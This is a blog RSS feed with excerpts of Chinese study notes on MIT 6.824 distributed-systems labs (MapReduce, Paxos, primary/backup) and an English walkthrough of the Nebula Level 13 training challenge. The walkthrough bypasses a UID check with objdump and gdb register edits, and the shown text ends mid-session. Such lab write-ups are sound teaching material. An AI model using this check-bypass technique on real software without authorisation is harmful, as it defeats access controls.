<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Exercises on Zea&#39;s</title>
    <link>/categories/exercises/</link>
    <description>Recent content in Exercises on Zea&#39;s</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <lastBuildDate>Wed, 09 Apr 2014 22:01:37 +0800</lastBuildDate>
    <atom:link href="/categories/exercises/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>6.824 Lab1 MapReduce Notes</title>
      <link>/post/2014-04-09-6-dot-824-mapreduce-notes/</link>
      <pubDate>Wed, 09 Apr 2014 22:01:37 +0800</pubDate>
      
      <guid>/post/2014-04-09-6-dot-824-mapreduce-notes/</guid>
      <description>

&lt;p&gt;作为 MIT 6.824 &lt;em&gt;分布式系统&lt;/em&gt; 这门课的第一个 Lab，其主要的目的是让学生熟悉下 Go 语言，因此不是特别难。事实上，2013 年的 Lab1 是做一个 P/B 架构的 LockService，感觉今年的这个 MapReduce 难度上有所下降，更加适合上手，而内容方面涉及了 MapReduce 的简单应用和实现，做完之后收获更大，总的来说整体水准高于去年的 LockService。&lt;/p&gt;

&lt;p&gt;Lab 共分为三个部分，Part I 要求在 MapReduce 上实现一个 WordCount，因为大部分的 MapReduce 框架都已经实现好了，所以这部分非常简单；支持代码（ Support code ）中的 MapReduce 是个非常简化的版本，没有 Master，顺序执行每一个 Map 和 Reduce 操作，Part II 的要求是实现一个简单的 Master； Part III 要在 Part II 的基础之上实现容忍客户端失败的情况。&lt;/p&gt;

&lt;p&gt;总的来讲，这个 Lab 中我们只需要实现一个简化版的 MapReduce 中的 Master Node 的逻辑部分。&lt;/p&gt;

&lt;h3 id=&#34;part-i:9d64eb79111af9673b332797623c91f4&#34;&gt;Part I&lt;/h3&gt;

&lt;p&gt;只有一点点代码要写，不过在动手之前还是要认真阅读支持代码，主要需要搞明白的是 Map 和 Reduce 函数的输入输出分别是什么：&lt;/p&gt;

&lt;p&gt;``` go wc.go
func Map(value string) *list.List {}&lt;/p&gt;

&lt;p&gt;func Reduce(key string, values *list.List) string {}
```&lt;/p&gt;

&lt;p&gt;为此需要看一看 mapreduce.go 中 DoMap 和 DoReduce 这两个方法。&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>6.824-lab3-notes</title>
      <link>/post/2014-02-21-6-dot-824-lab3-notes/</link>
      <pubDate>Fri, 21 Feb 2014 14:08:02 +0800</pubDate>
      
      <guid>/post/2014-02-21-6-dot-824-lab3-notes/</guid>
      <description>

&lt;h2 id=&#34;pre-read:6c805deaca0efd9342e0670f4a49bd04&#34;&gt;Pre-read&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://pdos.csail.mit.edu/6.824-2013/notes/l05.txt&#34;&gt;[Lecture Notes] Fault Tolerance: Paxos&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://pdos.csail.mit.edu/6.824-2013/papers/paxos-simple.pdf&#34;&gt;[Paper] Paxos Made Simple&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;/reading/papers/paxos-simple.html&#34;&gt;My Paxos Notes&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Paxos 键值存储系统包括&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;客户端（ client ）&lt;/li&gt;
&lt;li&gt;kvpaxos 服务器（ server ）&lt;/li&gt;
&lt;li&gt;Paxos 节点（ peers ）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;其中 Paxos 节点部分以类库的形式运行在服务器之上，在 lab3 的整体模型类似于 &lt;a href=&#34;http://pdos.csail.mit.edu/6.824-2013/papers/paxos-simple.pdf&#34;&gt;Paxos Made Simple&lt;/a&gt; 第三节提到的状态机，其中 proposer、acceptor 和 learner 都是 Paxos 节点，&lt;strong&gt;把整个键值存储服务看成一个状态机&lt;/strong&gt;，它会按照一定的顺序执行客户端发来的所有命令（ Put 请求），每个命令都确定性的把整个状态机向前推进一步。&lt;/p&gt;

&lt;p&gt;在这里，这个状态机是由很多服务器共同构成的，这些服务器之间彼此要&lt;strong&gt;保证执行的命令的顺序完全一致&lt;/strong&gt;，为此，我们维护一个有序序列 *list*，该序列就是所有服务器应当执行命令的顺序。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h1 id=&#34;在服务器收到一个-put-k-v-请求之后:6c805deaca0efd9342e0670f4a49bd04&#34;&gt;在服务器收到一个 Put(k, v) 请求之后&lt;/h1&gt;

&lt;ol&gt;
&lt;li&gt;在该序列中寻找到当前最小的空位 *list[n]*，也就是新命令应该存储的位置&lt;/li&gt;
&lt;li&gt;向 Paxos 节点 propose 在该位置上放置 &lt;em&gt;key=&amp;gt;value&lt;/em&gt; 这个命令，注意同时可能有多个服务器尝试向 &lt;em&gt;list[n]&lt;/em&gt; 这个位置放置命令，这时 Paxos 负责协调统一，决定最终放置在 &lt;em&gt;list[n]&lt;/em&gt; 处的命令应该是什么&lt;/li&gt;
&lt;li&gt;对于单个服务器而言，如果最终 Paxos 决定放置在 &lt;em&gt;list[n]&lt;/em&gt; 处的命令与其 propose 的相同，则放置命令成功，对 Put 命令的处理结束；反之，则继续尝试在 &lt;em&gt;list[n+1]&lt;/em&gt; 处放置其 propose 的命令。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;How Put(key, value) and px.Start(seq, v) meet?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Log slot?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;(* Paxos).Start(seq int, v interface{})&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;(* Paxos).Status(seq int) (decided bool, v interface{})&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&#34;part-b:6c805deaca0efd9342e0670f4a49bd04&#34;&gt;Part B&lt;/h2&gt;

&lt;p&gt;在 Part B 中，要在 Paxos 的基础之上实现一个键值存储系统，改系统所能处理的异常情况包括：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;TODO&lt;/li&gt;
&lt;li&gt;TODO&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Part B 中存储系统的结构依然包括客户端、服务端，与 Lab2 中不同的是服务端彼此之间利用 Paxos 来达成共识，因此在该部分中 Paxos 是运行在存储系统服务端之下的辅助系统。下文中提到的客户端、服务端均指存储系统的客户端河服务端。&lt;/p&gt;

&lt;p&gt;###基本工作原理&lt;/p&gt;

&lt;p&gt;服务器本地保存一个请求队列，收到客户端的请求先缓存起来，每次服务器&lt;strong&gt;只处理队列头的请求&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;每个Put请求都要添加一段随机的身份标识，当一个客户端向多个服务器发送请求的时候请求不会被重复处理。&lt;/p&gt;

&lt;p&gt;服务器维护一个列表，表示已经达成共识的消息日志（操作历史），当服务器处理一个请求的时候，尝试添加改请求到列表下一个位置，并通过 Paxos 与其他服务器达成共识。为了解决客户端重复请求的情况，服务器应当先检查本地是否包含改身份标识的操作，确认为新操作之后再进行添加请求。当该请求添加成功之后，处理缓存中下一个请求。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;如何确定消息应该添加的位置？&lt;/strong&gt;
由于 Paxos 在收到 decide 信息的时候并不会主动通知上层，因此当请求到来的时候，服务器端保存的消息日志可能只有 n 个 slot，然而底层的 Paxos 达成共识的已经有 n+m 个了。所以服务器在处理请求队列时应当：&lt;strong&gt;1.&lt;/strong&gt; 先同 Paxos 同步信息 &lt;strong&gt;2.&lt;/strong&gt; 根据请求的身份标识判断是否是重复请求 &lt;strong&gt;3.&lt;/strong&gt; 调用 Paxos.Start &lt;strong&gt;4.&lt;/strong&gt; 轮询 Paxos.Status &lt;strong&gt;5.&lt;/strong&gt; 请求占位成功，则返回，失败则返回第1步重新执行。&lt;/p&gt;

&lt;p&gt;服务器端维护的消息日志与 Paxos 节点中维护的消息列表是相对应的，内容也是一致的。不过服务端列表是完整的，而且包含了语义信息，而 Paxos 作为服务系统，并不了解列表中值的具体意义，而且 Paxos 中维护的列表内容是作为缓冲而存在的，一旦服务器同步了 Paxos 列表中的信息，就可以通过 Paxos.Done 来清空 Paxos 中缓存的信息。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Get请求直接从本地读取数据返回？&lt;/strong&gt;
也当成一个操作，请求共识，根据最终决定的操作顺序返回相应的值。&lt;/p&gt;

&lt;p&gt;一种可能的问题：客户端向服务器A发送了Put(a)=1的请求之后，又向服务器B发送Put(a)=2请求。因为Paxos请求并没有一个时间戳，所以可能出现发往B的请求先于发往A的请求达成了共识，造成&lt;strong&gt;客户端的不一致&lt;/strong&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>6.824 Lab2 Notes</title>
      <link>/post/2014-02-08-6-dot-824-lab2-notes/</link>
      <pubDate>Sat, 08 Feb 2014 15:53:24 +0800</pubDate>
      
      <guid>/post/2014-02-08-6-dot-824-lab2-notes/</guid>
      <description>

&lt;p&gt;Lab2要实现一个分布式键-值存储服务（key/value storage service），依然使用primary/backup的架构，支持&lt;strong&gt;Put(key, value)&lt;/strong&gt;和&lt;strong&gt;Get(key)&lt;/strong&gt;两种操作，所有的键-值都存储在P的内存中，不写入硬盘，在正常运行中要保证P/B的状态一致。此外，这个lab要求实现P/B的动态分配，所以在B能正常工作之前要先与P进行状态同步，而且服务器在挂掉之后可能恢复运行，成为新的B。为了使所有人（客户端、所有的服务器）看到的状态（即P/B分别是谁）一致，lab2中引入了视图服务（viewservice）作为一个控制服务器（master server），视图服务负责监控所有键-值服务器的连接状态，在P或B挂掉之后动态的指定新的。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h2 id=&#34;part-a:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;Part A&lt;/h2&gt;

&lt;p&gt;这一部分要实现视图服务，代码文件在/viewservice/文件夹下，命名规则与lab1相同。在partA中，Client的代码已经完整的给出了，我们需要实现的仅仅是Server部分。&lt;/p&gt;

&lt;p&gt;视图服务要实现两个RPC&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Ping(Me, Viewnum)&lt;/strong&gt; 键-值服务器通过该方法告诉视图服务：“我还活着，我所知道的当前的视图号是Viewnum”&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Get()&lt;/strong&gt; 键-值服务器服务器或其客户端通过该方法向视图服务询问当前最新的视图&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;其中视图的定义在*common.go*文件中&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type View struct {
	Viewnum uint
	Primary string
	Backup  string
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;一个&lt;strong&gt;视图（View）&lt;/strong&gt;表征了当前整个键-值存储服务的状态，它表示当前的主要服务器P是Primary，备份服务器B是Backup。每个视图还对应一个视图号（Viewnum），在视图服务初始化的时候视图号为0，以后每次视图发生变化（变更Primary或Backup）该值都会增加1。最开始的时候我以为视图服务要维护视图变更的历史，后来发现这其实是不需要的，视图服务只需要保存当前的视图就可以了。&lt;/p&gt;

&lt;p&gt;视图服务要维护一个包含当前所有键-值服务器的列表，这些服务器中，一个是P，一个是B，其他的都是I（idle，空闲服务器）。所有的键-值服务器每隔100ms（由常量PingInterval定义）就要Ping一下视图服务，如果一个服务器连续5个（由常量DeadPings定义）PingInterval内都没有Ping视图服务，则视图服务&lt;strong&gt;认为该服务器挂掉&lt;/strong&gt;。为了检测距离上一次某个服务器Ping视图服务过了多久，我在视图服务中存储了每个服务器最后一次Ping的时间。&lt;/p&gt;

&lt;p&gt;视图服务在当前视图被P确认之前是不会对视图进行更多的修改的，P确认当前视图的方式是发送一个包含当前视图号的Ping请求（也就是说P已经知道了当前的最新状态）。因此视图服务需要知道当前视图是否被确认了。&lt;/p&gt;

&lt;p&gt;该lab还有另外一个要求，我并没有在文档中看到（也可能是我漏看了=~=），但是在最后一个测试用例中定义了，即为确认当前视图的服务器不能成为P，测试原文是“Uninitialized server can&amp;rsquo;t become primary”，刚开始不清出初始化什么意思，看了测试代码才知道是要对当前的视图进行确认。为了过这一个测试必须知道每个服务器是否初始化了，所以我在记录每个服务器最后一次Ping时间的地方，同时记录了最后一个Ping的视图号。&lt;/p&gt;

&lt;p&gt;总的来讲，视图服务器端我所维护的信息如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type ClientInfo struct {
	name         string    // client&#39;s name
	last_ping    time.Time // Time of last Ping
	last_viewnum uint      // Viewnum of last Ping
	idle         bool      // whether this client is idle
	dead         bool      // whether this client is dead
}

type ViewServer struct {
	mu   sync.Mutex
	l    net.Listener
	dead bool
	me   string

	// Your declarations here.
	current_view      View
	acked             bool // current view is acked by P
	primary_restarted bool // P has restarted within DeadPings * PingInterval

	clients map[string]*ClientInfo // list of k/v servers
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;实现方面，主要需要实现的函数只有两个，Ping和tick，其中tick是一个私有方法，每隔PingInterval这么久视图服务器就会调用一次该方法。在我的实现中，我选择在Ping中修改服务器列表信息，而在tick中修改视图信息，当然，因为视图的变动而导致的服务器列表信息的变更也是在Tick中实现的。&lt;/p&gt;

&lt;p&gt;以上实现的一个结论就是视图服务视图的更新并不是及时的，这点应该是符合文档的描述的，文档中给了一个例子，但是因为解释的并不是特别清楚所以我并没能一下弄明白这个例子：&lt;/p&gt;

&lt;pre&gt;
Viewnum Primary Backup     Event
--------------------------------
0       none    none
                           server S1 sends Ping(0), which returns view 0
1       S1      none
                           server S2 sends Ping(0), which returns view 1
                             (no view change yet since S1 hasn&#39;t acked)
                           server S1 sends Ping(1), which returns view 1 or 2
2       S1      S2
                           server S1 sends Ping(2), which returns view 2
                           server S1 stops sending Pings
3       S2      none
                           server S2 sends Ping(3), which returns view 3
&lt;/pre&gt;

&lt;!--Viewnum | Primary | Backup | Event
------- | ------- | ------ | ---------
0 |none| none |
  |    |      | server S1 sends Ping(0), which returns view 0
1 | S1 | none |
  |    |      | server S2 sends Ping(0), which returns view 1 (no view change yet since S1 hasn&#39;t acked)
  |    |      | server S1 sends Ping(1), which returns view 1 or 2
2 | S1 |  S2  |
  |    |      | server S1 sends Ping(2), which returns view 2
  |    |      | server S1 stops sending Pings
3 | S2 | none |
  |    |      | server S2 sends Ping(3), which returns view 3
--&gt;

&lt;p&gt;S1向视图服务发送了Ping(0)请求之后服务器并不是立刻更新到视图1的，而是等到下一次tick执行的时候才检查当前视图能否更新，并空闲服务器列表中选出S1作为P。在tick执行之前，S1可能发送了多次Ping(0)给视图服务器，然而只有当tick执行之后，S1发送的Ping(0)请求才会返回view 1。&lt;/p&gt;

&lt;p&gt;文档对这个例子的解释并不完整，比如server S1 sends Ping(0), which returns view 0之后下一次出现S1就是server S1 sends Ping(1), which returns view 1 or 2，最开始看的时候我并不是很理解为啥S1收到view 0的返回值，下次会发送Ping(1)，其实是文档中把返回view 1的那次Ping(0)给省略掉了。这也解释了为啥S1发送Ping(1)会返回view 1 or 2，其实是第一次S1 Ping(1)的时候视图服务只是确认了view 1，还没有转换到view 2，但在确认之后的下一次tick中，视图服务会从空闲服务列表中拎出来一个S2作为B，切换到view 2，这时S1再发送Ping(1)就会返回view 2。&lt;/p&gt;

&lt;p&gt;而在view 2向view 3的切换过程中，S2也不是直接发送了Ping(3)，而是先发送Ping(2)，视图服务返回view 3，S2才知道自己当选了P，并向视图服务发送Ping(3)的。&lt;/p&gt;

&lt;h2 id=&#34;part-b:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;Part B&lt;/h2&gt;

&lt;p&gt;这一部分基本思路借鉴Lab1，不再大段总结了，大概阐述下每个函数应该做什么，然后记录下遇到的一些问题。&lt;/p&gt;

&lt;h3 id=&#34;functionality:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;Functionality&lt;/h3&gt;

&lt;p&gt;本部分说明各个函数的设计功能，采用函数所在位置（服务端、客户端）加函数命的方式来定位到具体的每个函数。首先客户端、服务端的变量结构如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type Clerk struct {
	vs    *viewservice.Clerk  // 视图服务
	cview viewservice.View    // 当前视图
}

type PBServer struct {
	mu         sync.Mutex
	l          net.Listener
	dead       bool // for testing
	unreliable bool // for testing
	me         string
	vs         *viewservice.Clerk

	// Your declarations here.
	cview  viewservice.View   // 当前视图
	db     map[string]string  // 数据库
	role   string             // 改服务器的角色P/B/I
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;此外我在原有的常量基础上新增了一个&lt;code&gt;ErrFwdToPrimary&lt;/code&gt;，表示发送了一个Forward请求给当前的P。&lt;/p&gt;

&lt;h4 id=&#34;client-get-put:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;Client - Get/Put&lt;/h4&gt;

&lt;p&gt;这两个函数实现基本结构是一样的&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;判断当前客户端看到的视图是否包含P，不包含的话更新当前视图&lt;/li&gt;
&lt;li&gt;向服务端发送请求&lt;/li&gt;
&lt;li&gt;1. 如果服务端没有返回或返回ErrWrongServer，更新视图再次进行步骤2

&lt;ol&gt;
&lt;li&gt;如果服务端返回成功，返回结果&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;server-get:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;Server - Get&lt;/h4&gt;

&lt;p&gt;本函数处理客户端发来的Get请求&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;判断自己是不是P，不是返回ErrWrongServer&lt;/li&gt;
&lt;li&gt;根据参数中的Key读取相应的Value，如果Key存在则返回Value，否则返回ErrNoKey&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;server-put:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;Server - Put&lt;/h4&gt;

&lt;p&gt;本函数处理客户端发来的Put请求&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;判断自己是不是P，不是返回ErrWrongServer&lt;/li&gt;
&lt;li&gt;如果存在B，Forward请求至B。否则跳至步骤4&lt;/li&gt;
&lt;li&gt;如果B返回ErrFwdToPrimary，则取消Put操作，并返回ErrWrongServer&lt;/li&gt;
&lt;li&gt;更新本地数据库，返回OK&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;server-forward:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;Server - Forward&lt;/h4&gt;

&lt;p&gt;本函数处理从P发向B的Fwd请求&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;如果自己是P，返回ErrFwdToPrimary&lt;/li&gt;
&lt;li&gt;如果自己是I，返回ErrWrongServer&lt;/li&gt;
&lt;li&gt;更新数据库，返回OK&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;server-sync:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;Server - Sync&lt;/h4&gt;

&lt;p&gt;本函数处理P发向B的同步请求，在I成为B之后，P会先同B进行一次同步，把自己的数据库复制给B一份，然后再把接下来的Put请求Forward给B&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;更新当前视图&lt;/li&gt;
&lt;li&gt;如果自己是P或者I，返回ErrWrongServer&lt;/li&gt;
&lt;li&gt;用参数中的数据库覆盖本地的数据库&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;在步骤1中之所以要先更新视图，因为一种可能的情况是P拿到了最新的视图，向B发送Sync请求，但B此时尚未更新，依然认为自己是I，就直接返回ErrWrongServer了。考虑到Sync请求相比Put、Forward而言要少很多，每次Sync都更新下视图是不会成为瓶颈的。&lt;/p&gt;

&lt;h4 id=&#34;server-tick:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;Server - tick&lt;/h4&gt;

&lt;p&gt;本函数在服务端每隔一段时间执行一次，功能实现非常简单，调用updateView()函数。&lt;/p&gt;

&lt;h4 id=&#34;server-updateview:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;Server - updateView&lt;/h4&gt;

&lt;p&gt;其实完全可以把我这个函数中的内容放在tick里，不过我最初为了把更新当前视图这个功能单独拉出来所以写了这么个函数&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;从视图服务获得最新的视图&lt;/li&gt;
&lt;li&gt;如果当前视图和最新视图一致，直接返回&lt;/li&gt;
&lt;li&gt;更新服务器的role属性&lt;/li&gt;
&lt;li&gt;如果我是P，而新视图中存在B，则进行一次Sync&lt;/li&gt;
&lt;li&gt;更新当前视图&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;问题笔记:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;问题笔记&lt;/h3&gt;

&lt;h4 id=&#34;什么时候需要向视图服务询问当前的视图:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;什么时候需要向视图服务询问当前的视图？&lt;/h4&gt;

&lt;ol&gt;
&lt;li&gt;每个tick需要&lt;/li&gt;
&lt;li&gt;当P从B那里收到Err&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;当B发现自己成了P，然而之前的P依然向他发送请求的时候，拒绝处理该请求；当P发现同步请求被B拒绝之后，知道自己已经不是P了，询问视图服务&lt;/p&gt;

&lt;h4 id=&#34;b如何区分来自client的put和来自p的put:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;B如何区分来自Client的Put和来自P的Put？&lt;/h4&gt;

&lt;p&gt;使用不同的接口: &lt;code&gt;Put&lt;/code&gt; &lt;code&gt;Forward&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Client是否需要添加Version信息?&lt;/p&gt;

&lt;h4 id=&#34;如何同步状态:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;如何同步状态&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;sync(db map[string]string)
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;bug-in-viewservice:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;BUG in viewservice&lt;/h4&gt;

&lt;pre&gt;
Tick() [/var/tmp/824-1000/pb-15185-basic-1]

----role:PRIMARY, view:{V:1, P:/var/tmp/824-1000/pb-15185-basic-1, B:}

Tick() [/var/tmp/824-1000/pb-15185-basic-1]

----role:PRIMARY, view:{V:2, P:/var/tmp/824-1000/pb-15185-basic-1, B:/var/tmp/824-1000/pb-15185-basic-1}
&lt;/pre&gt;

&lt;p&gt;viewservice会把P和B设成同一个Server&lt;/p&gt;

&lt;p&gt;clients list中S1会变成idle，原因是，在tick将S1设成P，但P未ack之前，S1 time out了，所以在之后的tick中会将S1设成idle&amp;amp;dead，但是因为还没有ack，所以server不会将idle&amp;amp;dead的S1从Primary中剔除出去，而是一直等待，直到S1回复运行之后再次正常的Ping，但是此时S1已经被设置成了idle，所以会被选来做B&lt;/p&gt;

&lt;p&gt;这跟我之前考虑到的一个bug类似，同样在S1被选为P，但尚未ack的时候，S1发生了一次crash，并快速恢复了，这时server会检测到一个primary_restarted，但是因为没有ack，所以不会handle，一直要等到S1 ack了之后才会handle，这时S1已经重启了，其内存数据已经丢失&lt;/p&gt;

&lt;h4 id=&#34;syncargs:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;SyncArgs&lt;/h4&gt;

&lt;p&gt;&lt;code&gt;map[string]string&lt;/code&gt; 是指针，不能作为RPC的参数传递。目前使用多个Forward请求来实现Sync，但这样效率极低，对性能影响较大。&lt;/p&gt;

&lt;p&gt;难道是因为我map变量是小写开头的，导致没有export？ client、server因为是同一份文件，编译时没有出现错误。把SyncArgs改为&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;type SyncArgs struct {
    DB map[string]string
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以通过Sync进行同步了，果然是这个原因！&lt;/p&gt;

&lt;h4 id=&#34;primary-would-not-respond-get-after-crash:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;Primary would not respond Get after crash&lt;/h4&gt;

&lt;p&gt;在Get中直接添加对当前身份的判断（pb.role）即可通过测试，但是一个问题是在视图服务判定S1不再是P，但S1收到该视图之前，S1依然认为自己是P，这种简单判断会在这个极段的时间内出现问题&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 13</title>
      <link>/post/2014-01-26-nebula-level13/</link>
      <pubDate>Sun, 26 Jan 2014 21:54:12 +0800</pubDate>
      
      <guid>/post/2014-01-26-nebula-level13/</guid>
      <description>

&lt;h3 id=&#34;about:d770d09b6be1c937de3594898fdf59fe&#34;&gt;About&lt;/h3&gt;

&lt;p&gt;There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.&lt;/p&gt;

&lt;p&gt;To do this level, log in as the &lt;em&gt;level13&lt;/em&gt; account with the password &lt;em&gt;level13&lt;/em&gt; . Files for this level can be found in /home/flag13.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&#34;source-code:d770d09b6be1c937de3594898fdf59fe&#34;&gt;Source code&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

#define FAKEUID 1000

int main(int argc, char **argv, char **envp)
{
	int c;
	char token[256];

	if(getuid() != FAKEUID) {
		printf(&amp;quot;Security failure detected. UID %d started us, we expect %d\n&amp;quot;, getuid(), FAKEUID);
		printf(&amp;quot;The system administrators will be notified of this violation\n&amp;quot;);
		exit(EXIT_FAILURE);
	}

	// snip, sorry :)

	printf(&amp;quot;your token is %s\n&amp;quot;, token);

}

&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;solution:d770d09b6be1c937de3594898fdf59fe&#34;&gt;Solution&lt;/h3&gt;

&lt;p&gt;There is no way for me to be uid 1000, but this executable which contains the token is right here, we cannot be stopped by a simple &lt;code&gt;if&lt;/code&gt; branch.&lt;/p&gt;

&lt;p&gt;Disassemble the executable &lt;em&gt;flag13&lt;/em&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level13@nebula:~$ objdump -D /home/flag13/flag13 &amp;gt; /home/level13/flag13.asm
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Go to the instruction corresponding to the last &lt;em&gt;printf()&lt;/em&gt; in the c code, I thought I could read the password out directly from the memory location where &lt;em&gt;token&lt;/em&gt; is stored. Turned out that &lt;em&gt;token&lt;/em&gt; is calculated with mass of code. Well, as I cannot read the password directly, I could always change the execution flow and let the program print that out.&lt;/p&gt;

&lt;p&gt;```text flag13.asm
080484c4 &lt;main&gt;:
 80484c4:       55                      push   %ebp
 80484c5:       89 e5                   mov    %esp,%ebp
 80484c7:       57                      push   %edi
 80484c8:       53                      push   %ebx
 80484c9:       83 e4 f0                and    $0xfffffff0,%esp
 80484cc:       81 ec 30 01 00 00       sub    $0x130,%esp
 80484d2:       8b 45 0c                mov    0xc(%ebp),%eax
 80484d5:       89 44 24 1c             mov    %eax,0x1c(%esp)
 80484d9:       8b 45 10                mov    0x10(%ebp),%eax
 80484dc:       89 44 24 18             mov    %eax,0x18(%esp)
 80484e0:       65 a1 14 00 00 00       mov    %gs:0x14,%eax
 80484e6:       89 84 24 2c 01 00 00    mov    %eax,0x12c(%esp)
 80484ed:       31 c0                   xor    %eax,%eax
 80484ef:       e8 cc fe ff ff          call   80483c0 &lt;a href=&#34;mailto:getuid@plt&#34;&gt;getuid@plt&lt;/a&gt;
 80484f4:       3d e8 03 00 00          cmp    $0x3e8,%eax
 80484f9:       74 36                   je     8048531 &lt;main+0x6d&gt;
 80484fb:       e8 c0 fe ff ff          call   80483c0 &lt;a href=&#34;mailto:getuid@plt&#34;&gt;getuid@plt&lt;/a&gt;
 8048500:       ba d0 86 04 08          mov    $0x80486d0,%edx
 8048505:       c7 44 24 08 e8 03 00    movl   $0x3e8,0x8(%esp)
&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;
This is the snippet of function *main()*, note that line 16 compare *%eax* (which is the return value of function call *getuid()*) with *0x3e8*, and line 17 will jump to memory location 0x8048531 if they are equal.

In a normal execution, these are apparantly not equal, but we could make it equal with *gdb*.

1. copy *flag13* into /home/level13
1. start it with *gdb*
1. set a break point at 0x80484f4, which is the instruction to compare
1. run the program
1. modify %eax to 1000 at the break point
1. continue run the program

``` bash
# start flag13 with gdb
level13@nebula:~$ gdb flag13
# set break point and run
(gdb) b *0x80484f4 
Breakpoint 1 at 0x80484f4
(gdb) run
Starting program: /home/level13/flag13
# reach break point, let&#39;s take a look at where we are
Breakpoint 1, 0x080484f4 in main ()
(gdb) disassemble
Dump of assembler code for function main:
   0x080484e0 &amp;lt;+28&amp;gt;:    mov    %gs:0x14,%eax
   0x080484e6 &amp;lt;+34&amp;gt;:    mov    %eax,0x12c(%esp)
   0x080484ed &amp;lt;+41&amp;gt;:    xor    %eax,%eax
   0x080484ef &amp;lt;+43&amp;gt;:    call   0x80483c0 &amp;lt;getuid@plt&amp;gt;
=&amp;gt; 0x080484f4 &amp;lt;+48&amp;gt;:    cmp    $0x3e8,%eax
   0x080484f9 &amp;lt;+53&amp;gt;:    je     0x8048531 &amp;lt;main+109&amp;gt;
   0x080484fb &amp;lt;+55&amp;gt;:    call   0x80483c0 &amp;lt;getuid@plt&amp;gt;
# here we print the registers out, %eax is 1014
(gdb) i r
eax            0x3f6    1014
ecx            0xbffff804       -1073743868
...
# change %eax
(gdb) set $eax=1000
(gdb) i r
eax            0x3e8    1000
ecx            0xbffff804       -1073743868
...
# continue execution 
